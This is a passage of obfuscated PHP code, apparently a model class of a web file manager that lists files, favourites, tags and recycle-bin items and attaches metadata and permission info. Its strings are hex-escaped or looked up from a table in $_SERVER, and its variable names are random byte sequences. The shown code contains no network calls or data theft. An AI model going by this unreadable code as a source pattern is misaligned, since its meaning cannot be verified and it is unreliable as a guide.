"\x6d\x65\164\141\x46\151\145\154\144" => "\163\157\x75\x72\143\145\111\x44"); protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\124\x69\155\145", "\164\x69\x6d\145", "\x69\x6e\163\x65\x72\164", "\146\x75\156\x63\x74\151\x6f\x6e"), array("\x63\x72\x65\x61\x74\x65\x54\x69\155\x65", "\x74\151\155\145", "\x69\x6e\x73\x65\x72\x74", "\146\x75\x6e\143\164\151\157\156"), array("\x76\151\145\x77\x54\151\155\x65", "\x74\151\155\x65", "\151\x6e\x73\145\162\x74", "\146\x75\x6e\143\x74\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($œ¬îï… ) { return $this->listSource(array($_SERVER[çâ¥×ø³][445] => $œ¬îï… )); } public function typeName($™‡—İ€) { static $ò–§·¶Ö = array(self::TYPE_SYSTEM => "\163\171\x73\x74\x65\155", self::TYPE_USER => "\x75\x73\145\x72", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $ò–§·¶Ö[$™‡—İ€ . $_SERVER[çâ¥×ø³][12]]; } public function sourceListInfo($Åıøê©‰, $âÜœŒ = false) { $ƒÔÑ¥¾ƒ =& $_SERVER[çâ¥×ø³]; $Åıøê©‰ = $Åıøê©‰ ? $Åıøê©‰ : array(); $Åıøê©‰ = array_filter(array_unique($Åıøê©‰)); if (!$Åıøê©‰) { return array(); } $ä†°Ââ = $this->where(array($ƒÔÑ¥¾ƒ[181] => array($ƒÔÑ¥¾ƒ[7], $Åıøê©‰)))->select(); $this->_listDataApply($ä†°Ââ, $âÜœŒ); return array_to_keyvalue($ä†°Ââ, $ƒÔÑ¥¾ƒ[181]); } public function pathInfoFilter(&$’›¹˜ò”) { $€ĞÚ½ì… =& $_SERVER[çâ¥×ø³]; static $ì†íß¢³ = false; static $ÄÃÉ‰ = false; static $œñ°Š = false; if (!$ì†íß¢³) { $§Æ¼¤Ó = $€ĞÚ½ì…[446]; $§Æ¼¤Ó .= $€ĞÚ½ì…[447]; $§Æ¼¤Ó .= $€ĞÚ½ì…[448]; $·ºàœüç = $€ĞÚ½ì…[449]; $½ƒÚ’ˆ‘ = explode($€ĞÚ½ì…[50], $·ºàœüç); $ì†íß¢³ = explode($€ĞÚ½ì…[50], $§Æ¼¤Ó); $ÄÃÉ‰ = array(); foreach ($ì†íß¢³ as $õ´ÓéµÄ) { if (in_array($õ´ÓéµÄ, $½ƒÚ’ˆ‘)) { continue; } $ÄÃÉ‰[] = $õ´ÓéµÄ; } $œñ°Š = explode($€ĞÚ½ì…[50], $€ĞÚ½ì…[450]); } foreach ($œñ°Š as $·üÒ¿ñÄ) { if (isset($’›¹˜ò”[$·üÒ¿ñÄ])) { $’›¹˜ò”[$·üÒ¿ñÄ] = intval($’›¹˜ò”[$·üÒ¿ñÄ]); } } $’›¹˜ò”[$€ĞÚ½ì…[84]] = $€ĞÚ½ì…[451] . $’›¹˜ò”[$€ĞÚ½ì…[181]] . $€ĞÚ½ì…[452]; $’›¹˜ò”[$€ĞÚ½ì…[33]] = $’›¹˜ò”[$€ĞÚ½ì…[453]] == 1 ? $€ĞÚ½ì…[75] : $€ĞÚ½ì…[214]; $’›¹˜ò”[$€ĞÚ½ì…[178]] = $this->typeName($’›¹˜ò”[$€ĞÚ½ì…[178]]); if ($’›¹˜ò”[$€ĞÚ½ì…[453]] != 1) { $’›¹˜ò”[$€ĞÚ½ì…[175]] = $’›¹˜ò”[$€ĞÚ½ì…[454]]; unset($’›¹˜ò”[$€ĞÚ½ì…[454]]); } $Ú „ãí— = $ì†íß¢³; if (isset($’›¹˜ò”[$€ĞÚ½ì…[455]]) && $’›¹˜ò”[$€ĞÚ½ì…[455]][$€ĞÚ½ì…[456]] == -1) { $Ú „ãí— = $ÄÃÉ‰; } $’›¹˜ò” = array_field_key($’›¹˜ò”, $Ú „ãí—); return $’›¹˜ò”; } public function listUserFav() { $ÌŸ—®°Ä =& $_SERVER[çâ¥×ø³]; $×ÃİÍåµ = Model($ÌŸ—®°Ä[457])->listData(); $à¶Ëƒù” = array_filter_by_field($×ÃİÍåµ, $ÌŸ—®°Ä[33], $ÌŸ—®°Ä[458]); $à¶Ëƒù” = array_to_keyvalue($à¶Ëƒù”, $ÌŸ—®°Ä[12], $ÌŸ—®°Ä[84]); if ($à¶Ëƒù”) { $İÅ¢ÙŠ· = $this->listSource(array($ÌŸ—®°Ä[459] => array($ÌŸ—®°Ä[460], $à¶Ëƒù”))); } $İÅ¢ÙŠ· = array_to_keyvalue($İÅ¢ÙŠ·[$ÌŸ—®°Ä[413]], $ÌŸ—®°Ä[181]); foreach ($×ÃİÍåµ as &$½¿Å¢–) { $½¿Å¢– = array($ÌŸ—®°Ä[461] => $½¿Å¢–[$ÌŸ—®°Ä[443]], $ÌŸ—®°Ä[462] => $½¿Å¢–[$ÌŸ—®°Ä[32]], $ÌŸ—®°Ä[463] => $½¿Å¢–[$ÌŸ—®°Ä[84]], $ÌŸ—®°Ä[464] => $½¿Å¢–[$ÌŸ—®°Ä[33]], $ÌŸ—®°Ä[465] => $½¿Å¢–[$ÌŸ—®°Ä[215]], $ÌŸ—®°Ä[466] => $½¿Å¢–[$ÌŸ—®°Ä[85]]); if ($½¿Å¢–[$ÌŸ—®°Ä[33]] == $ÌŸ—®°Ä[458] && $İÅ¢ÙŠ·[$½¿Å¢–[$ÌŸ—®°Ä[84]]]) { $½¿Å¢–[$ÌŸ—®°Ä[87]] = $İÅ¢ÙŠ·[$½¿Å¢–[$ÌŸ—®°Ä[84]]]; } } unset($½¿Å¢–); return $×ÃİÍåµ; } public function listUserTag($Á¡¼›Ú§) { $Â°§¯Ÿ =& $_SERVER[çâ¥×ø³]; if ($Á¡¼›Ú§ && !is_array($Á¡¼›Ú§)) { $Á¡¼›Ú§ = array($Á¡¼›Ú§); } $ÓÔ›éıÕ = Model($Â°§¯Ÿ[467])->listData(); $àÑõ‚° = array(); $şŠÈ°–£ = array(); foreach ($ÓÔ›éıÕ as $Éœ‚Àøú) { $õôëÁƒ¦ = $Éœ‚Àøú[$Â°§¯Ÿ[84]]; if (!$õôëÁƒ¦) { continue; } if (!isset($şŠÈ°–£[$õôëÁƒ¦])) { $şŠÈ°–£[$õôëÁƒ¦] = array(); } $şŠÈ°–£[$õôëÁƒ¦][] = $Éœ‚Àøú[$Â°§¯Ÿ[468]]; $àÑõ‚°[$Éœ‚Àøú[$Â°§¯Ÿ[84]]] = $Éœ‚Àøú; } $õŞÕ¼œ’ = array(); $ùßÅÚÃç = array(); $§ôãÍºÍ = array(); foreach ($şŠÈ°–£ as $÷÷Ù¿ªğ => $Î•€Ú) { $ó¸å™¸™ = !0; if (!$Á¡¼›Ú§) { $õŞÕ¼œ’[] = $÷÷Ù¿ªğ; continue; } foreach ($Á¡¼›Ú§ as $„é›âÜè) { if (!in_array($„é›âÜè, $Î•€Ú)) { $ó¸å™¸™ = !1; break; } } if (!$ó¸å™¸™) { continue; } if (!is_numeric($÷÷Ù¿ªğ)) { $çß–ªÌ = $àÑõ‚°[$÷÷Ù¿ªğ]; $÷äÑö° = array($Â°§¯Ÿ[32] => $çß–ªÌ[$Â°§¯Ÿ[32]], $Â°§¯Ÿ[84] => $çß–ªÌ[$Â°§¯Ÿ[84]], $Â°§¯Ÿ[33] => $çß–ªÌ[$Â°§¯Ÿ[33]], $Â°§¯Ÿ[87] => array($Â°§¯Ÿ[469] => 1), $Â°§¯Ÿ[216] => !0); if ($çß–ªÌ[$Â°§¯Ÿ[33]] == $Â°§¯Ÿ[214]) { $§ôãÍºÍ[] = $÷äÑö°; } if ($çß–ªÌ[$Â°§¯Ÿ[33]] == $Â°§¯Ÿ[75]) { $ùßÅÚÃç[] = $÷äÑö°; } continue; } $õŞÕ¼œ’[] = $÷÷Ù¿ªğ; } if ($õŞÕ¼œ’) { $Ò¹Áú“¿ = $this->listSource(array($Â°§¯Ÿ[459] => array($Â°§¯Ÿ[460], $õŞÕ¼œ’))); } $Ò¹Áú“¿ = $Ò¹Áú“¿ ? $Ò¹Áú“¿ : array($Â°§¯Ÿ[82] => array(), $Â°§¯Ÿ[83] => array()); $Ò¹Áú“¿[$Â°§¯Ÿ[82]] = array_merge($Ò¹Áú“¿[$Â°§¯Ÿ[82]], $ùßÅÚÃç); $Ò¹Áú“¿[$Â°§¯Ÿ[83]] = array_merge($Ò¹Áú“¿[$Â°§¯Ÿ[83]], $§ôãÍºÍ); if (isset($Ò¹Áú“¿[$Â°§¯Ÿ[410]]) && count($õŞÕ¼œ’) == $Ò¹Áú“¿[$Â°§¯Ÿ[410]][$Â°§¯Ÿ[411]]) { return $Ò¹Áú“¿; } $ÍÌüò¥‘ = array(); $¥ùí’æƒ = array_to_keyvalue($Ò¹Áú“¿[$Â°§¯Ÿ[82]], $Â°§¯Ÿ[12], $Â°§¯Ÿ[181]); $¥àöÑÆ‘ = array_to_keyvalue($Ò¹Áú“¿[$Â°§¯Ÿ[83]], $Â°§¯Ÿ[12], $Â°§¯Ÿ[181]); $Éˆ‹äıù = array_merge($¥àöÑÆ‘, $¥ùí’æƒ); foreach ($õŞÕ¼œ’ as $õôëÁƒ¦) { if (!in_array($õôëÁƒ¦, $Éˆ‹äıù)) { $ÍÌüò¥‘[] = $õôëÁƒ¦; } } if ($ÍÌüò¥‘) { Model($Â°§¯Ÿ[470])->removeBySource($ÍÌüò¥‘); } return $Ò¹Áú“¿; } public function listUserRecycle() { $Òî»½Å‹ =& $_SERVER[çâ¥×ø³]; $¹”çÜ — = Model($Òî»½Å‹[471])->listData(); if (!$¹”çÜ —) { return array(); } $ç‰­¤±ë = array($Òî»½Å‹[459] => array($Òî»½Å‹[460], $¹”çÜ —), $Òî»½Å‹[472] => 1); return $this->listSource($ç‰­¤±ë); } public function listSource($‰áùşí, $˜ÚâÔğç = 3000, $‘¼ı Ôó = false) { $û£ìğüË =& $_SERVER[çâ¥×ø³]; if (!isset($‰áùşí[$û£ìğüË[473]])) { $‰áùşí[$û£ìğüË[473]] = 0; } if (isset($‰áùşí[$û£ìğüË[180]]) && $‰áùşí[$û£ìğüË[180]] == $û£ìğüË[212]) { $‰áùşí[$û£ìğüË[454]] = array($û£ìğüË[375], $û£ìğüË[474]); } $æ±ä÷Ò = $û£ìğüË[475]; $·ã€˜™õ = $this->field($æ±ä÷Ò)->_makeOrder()->where($‰áùşí)->selectPage($˜ÚâÔğç); $this->_listPageCheck($·ã€˜™õ, $æ±ä÷Ò, $‰áùşí); $this->_listDataApply($·ã€˜™õ[$û£ìğüË[413]], $‘¼ı Ôó); $this->_listMake($·ã€˜™õ); return $·ã€˜™õ; } private function _listPageCheck(&$ÒØ£„ß, $ë†òö†¹, $·ÂµÙ¦¯) { $Ù­Õ¶í‡ =& $_SERVER[çâ¥×ø³]; if (!is_array($ÒØ£„ß[$Ù­Õ¶í‡[410]])) { return; } $†‰Ê²ÓØ = $ÒØ£„ß[$Ù­Õ¶í‡[410]]; if ($†‰Ê²ÓØ[$Ù­Õ¶í‡[412]] <= 1) { return; } if ($†‰Ê²ÓØ[$Ù­Õ¶í‡[411]] >= 100000) { return; } if (Model($Ù­Õ¶í‡[476])->get($Ù­Õ¶í‡[477]) != $Ù­Õ¶í‡[478]) { return; } $ë†òö†¹ = str_replace(array($Ù­Õ¶í‡[53], $Ù­Õ¶í‡[386], $Ù­Õ¶í‡[246]), $Ù­Õ¶í‡[12], $ë†òö†¹); $ë†òö†¹ = $Ù­Õ¶í‡[479] . str_replace($Ù­Õ¶í‡[50], $Ù­Õ¶í‡[480], $ë†òö†¹) . $Ù­Õ¶í‡[481]; $¹õˆü‚½ = $Ù­Õ¶í‡[482]; $¹õˆü‚½ = $¹õˆü‚½ . $Ù­Õ¶í‡[483]; $çËÌ©‰ó = $†‰Ê²ÓØ[$Ù­Õ¶í‡[407]] * ($†‰Ê²ÓØ[$Ù­Õ¶í‡[397]] - 1) . $Ù­Õ¶í‡[50] . $†‰Ê²ÓØ[$Ù­Õ¶í‡[407]]; $‚ÆåµÇ = $this->_makeOrder(!0); $¼´à¼¥Û = $Ù­Õ¶í‡[479] . str_replace($Ù­Õ¶í‡[50], $Ù­Õ¶í‡[480], $‚ÆåµÇ[0]); if (strpos($¼´à¼¥Û, $Ù­Õ¶í‡[484])) { $¼´à¼¥Û = str_replace($Ù­Õ¶í‡[484], $Ù­Õ¶í‡[485], $¼´à¼¥Û); } else { $¼´à¼¥Û .= $Ù­Õ¶í‡[486] . $‚ÆåµÇ[1]; } $š¡ãÚØ = array(); foreach ($·ÂµÙ¦¯ as $—•¿çß÷ => $Œ»†ÊŞ) { $š¡ãÚØ[$Ù­Õ¶í‡[479] . $—•¿çß÷] = $Œ»†ÊŞ; } $this->alias($Ù­Õ¶í‡[487])->field($ë†òö†¹)->limit($çËÌ©‰ó)->order($¼´à¼¥Û); $‘µœ»µú = $this->join($¹õˆü‚½)->where($š¡ãÚØ)->select(); if ($‘µœ»µú) { $ÒØ£„ß[$Ù­Õ¶í‡[413]] = $‘µœ»µú; } } protected function _makeOrder($÷ÔàºŞÓ = false) { $‰ÔŒ›ÏŠ =& $_SERVER[çâ¥×ø³]; $ı‘Û‘¥© = Model($‰ÔŒ›ÏŠ[488])->get($‰ÔŒ›ÏŠ[489]); $ÀÛÆ¨ê = Model($‰ÔŒ›ÏŠ[488])->get($‰ÔŒ›ÏŠ[490]); $Ÿğ‚·Ã– = array($‰ÔŒ›ÏŠ[491] => $‰ÔŒ›ÏŠ[492], $‰ÔŒ›ÏŠ[493] => $‰ÔŒ›ÏŠ[494]); $¤³˜ÛĞ = array($‰ÔŒ›ÏŠ[32] => $‰ÔŒ›ÏŠ[32], $‰ÔŒ›ÏŠ[76] => $‰ÔŒ›ÏŠ[76], $‰ÔŒ›ÏŠ[175] => $‰ÔŒ›ÏŠ[454], $‰ÔŒ›ÏŠ[495] => $‰ÔŒ›ÏŠ[495], $‰ÔŒ›ÏŠ[496] => $‰ÔŒ›ÏŠ[497], $‰ÔŒ›ÏŠ[215] => $‰ÔŒ›ÏŠ[215], $‰ÔŒ›ÏŠ[85] => $‰ÔŒ›ÏŠ[85]); $„ÙÜ©— = Input::get($‰ÔŒ›ÏŠ[498], $‰ÔŒ›ÏŠ[7], $ı‘Û‘¥©, array_keys($¤³˜ÛĞ)); $®ãŒ–Ü­ = Input::get($‰ÔŒ›ÏŠ[499], $‰ÔŒ›ÏŠ[7], $ÀÛÆ¨ê, array_keys($Ÿğ‚·Ã–)); if (!in_array($„ÙÜ©—, array_keys($¤³˜ÛĞ))) { $„ÙÜ©— = $‰ÔŒ›ÏŠ[32]; } if (!in_array($®ãŒ–Ü­, array_keys($Ÿğ‚·Ã–))) { $„ÙÜ©— = $‰ÔŒ›ÏŠ[491]; } if ($„ÙÜ©— == $‰ÔŒ›ÏŠ[32]) { } $–ïïå‰Â = $‰ÔŒ›ÏŠ[500] . $¤³˜ÛĞ[$„ÙÜ©—] . $‰ÔŒ›ÏŠ[53] . $Ÿğ‚·Ã–[$®ãŒ–Ü­]; $–ïïå‰Â = rtrim(trim($–ïïå‰Â), $‰ÔŒ›ÏŠ[50]); if ($÷ÔàºŞÓ) { return array($–ïïå‰Â, $Ÿğ‚·Ã–[$®ãŒ–Ü­]); } return $this->order($–ïïå‰Â); } protected function _listDataApplyItem($üñ€Æğ‰, $ü±…®‘ª = false) { $¶£İÔºÔ = array($üñ€Æğ‰); $this->_listDataApply($¶£İÔºÔ, $ü±…®‘ª); return $¶£İÔºÔ[0]; } protected function _listDataApply(&$ñ›ú®‡, $¢³Øß• = false) { $ÔˆÜù£ô =& $_SERVER[çâ¥×ø³]; if (!$ñ›ú®‡) { $ñ›ú®‡ = array(); return; } $ñ…¨î‰ü = array_to_keyvalue($ñ›ú®‡, $ÔˆÜù£ô[12], $ÔˆÜù£ô[181]); $ñ…¨î‰ü = array_unique($ñ…¨î‰ü); $this->_listSourceCache($ñ›ú®‡); if (!$¢³Øß•) { $this->_listAppendMeta($ñ›ú®‡, $ñ…¨î‰ü); $this->_listAppendFileMeta($ñ›ú®‡, $ñ…¨î‰ü); $this->_listAppendChildren($ñ›ú®‡, $ñ…¨î‰ü); } $this->_listAppendPath($ñ›ú®‡); $this->_listAppendAuth($ñ›ú®‡); $this->_listAppendSourceInfo($ñ›ú®‡, $ñ…¨î‰ü); $this->_listAppendUser($ñ›ú®‡); $this->_listFilterInfo($ñ›ú®‡, $¢³Øß•); $this->_listAppendAuthSecret($ñ›ú®‡); } protected function _listSourceCache($­¢ïÕÚ‡) { $¨š©úî =& $_SERVER[çâ¥×ø³]; foreach ($­¢ïÕÚ‡ as $•ÅˆÈŠÉ) { self::$cacheSourceInfo[$¨š©úî[501] . $•ÅˆÈŠÉ[$¨š©úî[181]]] = $•ÅˆÈŠÉ; } } protected function _listFilterInfo(&$û•ê©‰ê, $Àê¯ê¬è = false) { $ŒúÀÅ¨ =& $_SERVER[çâ¥×ø³]; foreach ($û•ê©‰ê as &$‰ñ¡Ñ…) { $‰ñ¡Ñ… = $this->pathInfoFilter($‰ñ¡Ñ…); self::$cachePathInfo[$ŒúÀÅ¨[502] . intval($Àê¯ê¬è) . $ŒúÀÅ¨[430] . $‰ñ¡Ñ…[$ŒúÀÅ¨[181]]] = $‰ñ¡Ñ…; } unset($‰ñ¡Ñ…); } protected function _listMake(&$Ÿı¸†‘ô) { $¹¬ìØç  =& $_SERVER[çâ¥×ø³]; $Ÿı¸†‘ô[$¹¬ìØç [82]] = array(); $Ÿı¸†‘ô[$¹¬ìØç [83]] = array(); foreach ($Ÿı¸†‘ô[$¹¬ìØç [413]] as $Âè›Şªö) { $õÛÒçÅ× = $Âè›Şªö[$¹¬ìØç [453]] == 1 ? $¹¬ìØç [82] : $¹¬ìØç [83]; $Ÿı¸†‘ô[$õÛÒçÅ×][] = $Âè›Şªö; } unset($Ÿı¸†‘ô[$¹¬ìØç [413]]); } protected function _listAppendMeta(&$ÓŸ×Ë°ª, $×Ó­„ş) { $Ø¿ß“°‘ =& $_SERVER[çâ¥×ø³]; $‡ªéæ¸í = array($Ø¿ß“°‘[459] => array($Ø¿ß“°‘[460], $×Ó­„ş)); $ç•“»«ø = Model($Ø¿ß“°‘[503])->field($Ø¿ß“°‘[504])->where($‡ªéæ¸í)->select(); if (!$ç•“»«ø) { return; } $ÏãùøÙÍ = array($Ø¿ß“°‘[505], $Ø¿ß“°‘[506], $Ø¿ß“°‘[485]); $¨Î€àâÉ = array(); foreach ($ç•“»«ø as $ˆÛÉÃ‰) { if (!isset($¨Î€àâÉ[$ˆÛÉÃ‰[$Ø¿ß“°‘[181]]])) { $¨Î€àâÉ[$ˆÛÉÃ‰[$Ø¿ß“°‘[181]]] = array(); } if (in_array($ˆÛÉÃ‰[$Ø¿ß“°‘[94]], $ÏãùøÙÍ)) { continue; } $¨Î€àâÉ[$ˆÛÉÃ‰[$Ø¿ß“°‘[181]]][$ˆÛÉÃ‰[$Ø¿ß“°‘[94]]] = $ˆÛÉÃ‰[$Ø¿ß“°‘[418]]; } foreach ($ÓŸ×Ë°ª as &$ç¦» ÑÇ) { $ç¦» ÑÇ[$Ø¿ß“°‘[507]] = !1; if (isset($¨Î€àâÉ[$ç¦» ÑÇ[$Ø¿ß“°‘[181]]])) { $ç¦» ÑÇ[$Ø¿ß“°‘[507]] = $¨Î€àâÉ[$ç¦» ÑÇ[$Ø¿ß“°‘[181]]]; } if ($this->fileIsLock($ç¦» ÑÇ) && $ç¦» ÑÇ[$Ø¿ß“°‘[455]]) { $—šãÑç¢ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ç¦» ÑÇ[$Ø¿ß“°‘[455]][$Ø¿ß“°‘[456]] = AuthModel::authDisable($ç¦» ÑÇ[$Ø¿ß“°‘[455]][$Ø¿ß“°‘[456]], $—šãÑç¢); $ç¦» ÑÇ[$Ø¿ß“°‘[455]][$Ø¿ß“°‘[508]][$Ø¿ß“°‘[455]] = $ç¦» ÑÇ[$Ø¿ß“°‘[455]][$Ø¿ß“°‘[456]]; } } unset($ç¦» ÑÇ); } protected function _listAppendFileMeta(&$Š™íÓ¹Û, $Ÿ«•Æ‹˜) { $àªøéŞ¹ =& $_SERVER[çâ¥×ø³]; $îÂÁä§ß = array_to_keyvalue($Š™íÓ¹Û, $àªøéŞ¹[12], $àªøéŞ¹[509]); $îÂÁä§ß = array_filter(array_unique($îÂÁä§ß)); if (!$îÂÁä§ß) { return; } $¦³†şàı = array($àªøéŞ¹[510] => array($àªøéŞ¹[460], $îÂÁä§ß)); $ˆÇİúøù = $àªøéŞ¹[511]; $…‰àí·ƒ = Model($àªøéŞ¹[512])->field($ˆÇİúøù)->where($¦³†şàı)->select(); $…‰àí·ƒ = array_to_keyvalue($…‰àí·ƒ, $àªøéŞ¹[509]); $–¯Á–Ô” = Model($àªøéŞ¹[513])->field($àªøéŞ¹[514])->where($¦³†şàı)->select(); $–¯Á–Ô” = $–¯Á–Ô” ? $–¯Á–Ô” : array(); $ƒØ°Ù„ä = array(); foreach ($–¯Á–Ô” as $Ë§§³¤Ğ) { if (!isset($ƒØ°Ù„ä[$Ë§§³¤Ğ[$àªøéŞ¹[509]]])) { $ƒØ°Ù„ä[$Ë§§³¤Ğ[$àªøéŞ¹[509]]] = array(); } $ƒØ°Ù„ä[$Ë§§³¤Ğ[$àªøéŞ¹[509]]][$Ë§§³¤Ğ[$àªøéŞ¹[94]]] = $Ë§§³¤Ğ[$àªøéŞ¹[418]]; } foreach ($Š™íÓ¹Û as &$çÖãøóÙ) { $ÈóÖë«º = $çÖãøóÙ[$àªøéŞ¹[509]]; if (!$ÈóÖë«º || !is_array($…‰àí·ƒ[$ÈóÖë«º])) { continue; } $ˆúê Ë€ = $…‰àí·ƒ[$ÈóÖë«º]; $ˆúê Ë€[$àªøéŞ¹[76]] = $çÖãøóÙ[$àªøéŞ¹[76]]; $ˆúê Ë€[$àªøéŞ¹[32]] = $çÖãøóÙ[$àªøéŞ¹[32]]; if (!isset(self::$cacheFileInfo[$àªøéŞ¹[515] . $ÈóÖë«º])) { self::$cacheFileInfo[$àªøéŞ¹[515] . $ÈóÖë«º] = array_merge(array(), $ˆúê Ë€); } unset($…‰àí·ƒ[$ÈóÖë«º][$àªøéŞ¹[84]]); $‡¡òª“ª = is_array($ƒØ°Ù„ä[$ÈóÖë«º]) ? $ƒØ°Ù„ä[$ÈóÖë«º] : array(); $çÖãøóÙ[$àªøéŞ¹[516]] = array_merge($‡¡òª“ª, $…‰àí·ƒ[$ÈóÖë«º]); if (isset($çÖãøóÙ[$àªøéŞ¹[516]][$àªøéŞ¹[171]])) { $çÖãøóÙ[$àªøéŞ¹[171]] = json_decode($çÖãøóÙ[$àªøéŞ¹[516]][$àªøéŞ¹[171]], !0); unset($çÖãøóÙ[$àªøéŞ¹[516]][$àªøéŞ¹[171]]); } } unset($çÖãøóÙ); } protected function _listAppendSourceInfo(&$šÚÉ¦Ûç, $ëó“ƒµ‚) { $·à•şÇ =& $_SERVER[çâ¥×ø³]; $š‘Ü•Ûñ = Model($·à•şÇ[517])->listData(); $Ò¸›¤‚Û = Model($·à•şÇ[467])->listData(); $Ö»Íö¸ = Model($·à•şÇ[457])->listData(); $”•„äÇş = Model($·à•şÇ[518])->listSimple(); $½ßûå· = array_to_keyvalue($š‘Ü•Ûñ, $·à•şÇ[443]); $äÎÂ²Úë = array_to_keyvalue_group($Ò¸›¤‚Û, $·à•şÇ[84], $·à•şÇ[468]); $ïª • = array_to_keyvalue($Ö»Íö¸, $·à•şÇ[84]); $»ÄœØ³² = array_to_keyvalue_group($”•„äÇş, $·à•şÇ[181]); foreach ($šÚÉ¦Ûç as &$Ü¾ÓŒ„¢) { $Ü¾ÓŒ„¢[$·à•şÇ[87]] = array($·à•şÇ[519] => 0, $·à•şÇ[520] => 0, $·à•şÇ[521] => 0); if (isset($ïª •[$Ü¾ÓŒ„¢[$·à•şÇ[181]]])) { $Ü¾ÓŒ„¢[$·à•şÇ[87]][$·à•şÇ[522]] = 1; $Ü¾ÓŒ„¢[$·à•şÇ[87]][$·à•şÇ[523]] = $ïª •[$Ü¾ÓŒ„¢[$·à•şÇ[181]]][$·à•şÇ[32]]; } if ($äÎÂ²Úë && $½ßûå· && isset($äÎÂ²Úë[$Ü¾ÓŒ„¢[$·à•şÇ[181]]])) { $Ü¾ÓŒ„¢[$·à•şÇ[87]][$·à•şÇ[524]] = array(); foreach ($äÎÂ²Úë[$Ü¾ÓŒ„¢[$·à•şÇ[181]]] as $™íÏõ ³) { $è¿çıÙ = $½ßûå·[$™íÏõ ³]; $Ü¾ÓŒ„¢[$·à•şÇ[87]][$·à•şÇ[524]][] = array($·à•şÇ[525] => $è¿çıÙ[$·à•şÇ[443]], $·à•şÇ[462] => $è¿çıÙ[$·à•şÇ[32]], $·à•şÇ[526] => $è¿çıÙ[$·à•şÇ[527]]); } } if ($»ÄœØ³² && isset($»ÄœØ³²[$Ü¾ÓŒ„¢[$·à•şÇ[181]]])) { $Ü¾ÓŒ„¢[$·à•şÇ[87]][$·à•şÇ[528]] = array(); foreach ($»ÄœØ³²[$Ü¾ÓŒ„¢[$·à•şÇ[181]]] as $ÂóÉÈ¯¥) { $äù°†¿Ç = $·à•şÇ[529]; if ($ÂóÉÈ¯¥[$·à•şÇ[530]] == $·à•şÇ[88]) { $äù°†¿Ç .= $·à•şÇ[531]; } $Ü¾ÓŒ„¢[$·à•şÇ[87]][$·à•şÇ[528]] = array_field_key($ÂóÉÈ¯¥, explode($·à•şÇ[50], $äù°†¿Ç)); } } } unset($Ü¾ÓŒ„¢); return $šÚÉ¦Ûç; } protected function _listAppendChildren(&$ÌÀˆÅ¼Å, $¹÷‹µ¼ö) { $«èàÌÀ =& $_SERVER[çâ¥×ø³]; $şŸ´–° = array(); $£ÊÚõ¥Š = array($«èàÌÀ[223] => 0, $«èàÌÀ[224] => 0); foreach ($ÌÀˆÅ¼Å as &$–“İÙÔª) { if (!$–“İÙÔª[$«èàÌÀ[453]]) { continue; } $şŸ´–°[] = $–“İÙÔª[$«èàÌÀ[181]]; } unset($–“İÙÔª); if (!$şŸ´–°) { return; } $É¸åŸŞ‘ = array($«èàÌÀ[180] => array($«èàÌÀ[7], $şŸ´–°), $«èàÌÀ[473] => 0); $°÷­›âü = array($«èàÌÀ[180], $«èàÌÀ[453], $«èàÌÀ[532] => $«èàÌÀ[533]); $™—Ì‚² = $this->field($°÷­›âü)->where($É¸åŸŞ‘)->group($«èàÌÀ[534])->select(); $™õí¨á = array(); foreach ($™—Ì‚² as $Ô¦÷ëø®) { $Ë’â‰ÑÈ = $Ô¦÷ëø®[$«èàÌÀ[180]]; $òÏÅêÄË = $Ô¦÷ëø®[$«èàÌÀ[453]] == $«èàÌÀ[88] ? $«èàÌÀ[224] : $«èàÌÀ[223]; if (!isset($™õí¨á[$Ë’â‰ÑÈ])) { $™õí¨á[$Ë’â‰ÑÈ] = array($«èàÌÀ[223] => 0, $«èàÌÀ[224] => 0); } $™õí¨á[$Ë’â‰ÑÈ][$òÏÅêÄË] += $Ô¦÷ëø®[$«èàÌÀ[533]]; } foreach ($ÌÀˆÅ¼Å as &$–“İÙÔª) { if (!$–“İÙÔª[$«èàÌÀ[453]]) { continue; } $ßÁŞš‘ç = is_array($™õí¨á[$–“İÙÔª[$«èàÌÀ[181]]]) ? $™õí¨á[$–“İÙÔª[$«èàÌÀ[181]]] : $£ÊÚõ¥Š; $–“İÙÔª[$«èàÌÀ[224]] = $ßÁŞš‘ç[$«èàÌÀ[224]]; $–“İÙÔª[$«èàÌÀ[223]] = $ßÁŞš‘ç[$«èàÌÀ[223]]; unset($–“İÙÔª[$«èàÌÀ[454]]); } unset($–“İÙÔª); } protected function _listAppendAuth(&$Šë¦ã¾à) { $¤Éíßê¡ =& $_SERVER[çâ¥×ø³]; $çöñÚ‘¬ = array(); foreach ($Šë¦ã¾à as $Æ££º¹) { if ($Æ££º¹[$¤Éíßê¡[178]] == self::TYPE_GROUP) { $çöñÚ‘¬[] = $Æ££º¹[$¤Éíßê¡[181]]; } } if (!$çöñÚ‘¬) { return; } $Ç¨ÎÓÀ = array_to_keyvalue($Šë¦ã¾à, $¤Éíßê¡[181]); $ê–ìáèÅ = Model($¤Éíßê¡[535])->getSourceList($çöñÚ‘¬, $Ç¨ÎÓÀ); $ƒ¨ú£‡ñ = $GLOBALS[$¤Éíßê¡[536]] == 1; foreach ($Šë¦ã¾à as $¢ƒá»« => &$Æ££º¹) { $Æ££º¹[$¤Éíßê¡[455]] = $ê–ìáèÅ[$Æ££º¹[$¤Éíßê¡[181]]]; if (!$Æ££º¹[$¤Éíßê¡[455]] && $Æ££º¹[$¤Éíßê¡[178]] == self::TYPE_GROUP) { $Æ££º¹[$¤Éíßê¡[455]] = Action($¤Éíßê¡[537])->pathGroupAuthMake($Æ££º¹[$¤Éíßê¡[538]]); if (!$Æ££º¹[$¤Éíßê¡[455]] && !$ƒ¨ú£‡ñ) { $Æ££º¹[$¤Éíßê¡[217]] = !1; $Æ££º¹[$¤Éíßê¡[216]] = !1; } } if ($Æ££º¹[$¤Éíßê¡[455]]) { $Æ££º¹[$¤Éíßê¡[217]] = AuthModel::authCheckEdit($Æ££º¹[$¤Éíßê¡[455]][$¤Éíßê¡[456]]); $Æ££º¹[$¤Éíßê¡[216]] = AuthModel::authCheckView($Æ££º¹[$¤Éíßê¡[455]][$¤Éíßê¡[456]]); } $this->groupPathDisplay($Æ££º¹); } unset($Æ££º¹); } public function _listAppendAuthSecret(&$ó·•ÀºÍ) { $©Ñ²ä¦ 